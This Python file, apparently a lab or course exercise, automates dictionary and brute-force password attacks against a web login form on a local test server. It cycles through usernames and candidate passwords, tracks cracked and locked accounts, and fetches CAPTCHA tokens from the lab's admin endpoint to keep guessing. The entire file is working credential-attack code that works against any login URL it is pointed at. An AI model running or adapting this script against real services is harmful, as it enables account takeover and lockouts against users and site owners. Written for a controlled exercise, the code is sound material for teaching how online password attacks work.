import itertools
import string
import time
import requests
from bs4 import BeautifulSoup

GROUP_SEED = '300225935'
URL = 'http://localhost:5000'
SECONDS_PER_HOUR = 3600
TOTAL_HOURS = 2

def dictionary_attack(users, wordlist_filepath):
    cracked = {}
    captcha_required = False
    with open(wordlist_filepath, 'r') as wordlist:
        start = time.time()
        for line in wordlist:
            password = line.strip()
            for username in users:
                if username not in cracked:
                    result, captcha_required = _try_password(username, password, captcha_required)
                    if result is None:
                        cracked[username] = None
                        if len(cracked) == len(users):
                            return cracked
                    elif result:
                        cracked[username] = password
                        if len(cracked) == len(users):
                            return cracked
                    elif time.time() - start > SECONDS_PER_HOUR * TOTAL_HOURS:
                        return cracked
    return cracked

def bruteforce_attack(users, digit, lowercase, uppercase, special, max_password_length):
    chars = ""
    chars = chars + string.digits if digit else chars
    chars = chars + string.ascii_lowercase if lowercase else chars
    chars = chars + string.ascii_uppercase if uppercase else chars
    chars = chars + string.punctuation if special else chars
    cracked = {}
    captcha_required = False
    start = time.time()
    for length in range(1, max_password_length + 1):
        for password in _gen_passwords(chars, length):
            for username in users:
                if username not in cracked:
                    result, captcha_required = _try_password(username, password, captcha_required)
                    if result is None:
                        cracked[username] = None
                        if len(cracked) == len(users):
                            return cracked
                    elif result:
                        cracked[username] = password
                        if len(cracked) == len(users):
                            return cracked
                    elif time.time() - start > SECONDS_PER_HOUR * TOTAL_HOURS:
                        return cracked
    return cracked

def _gen_passwords(chars, length):
    for attempt in itertools.product(chars, repeat=length):
        yield ''.join(attempt)

def _try_password(username, password, captcha_required):
    payload = {'username': username, 'password': password}
    if captcha_required:
        payload['captcha'] = _get_captcha_token()
    response = requests.post(URL + '/login', data=payload)
    soup = BeautifulSoup(response.content, 'html.parser')
    captcha_required = soup.find(id="captcha") is not None
    msg = soup.find(id="msg").get_text()
    return None if msg == "locked" else msg == "logged in", captcha_required

def _get_captcha_token():
    return requests.get(URL + '/admin/get_captcha_token?group_seed=' + GROUP_SEED).text
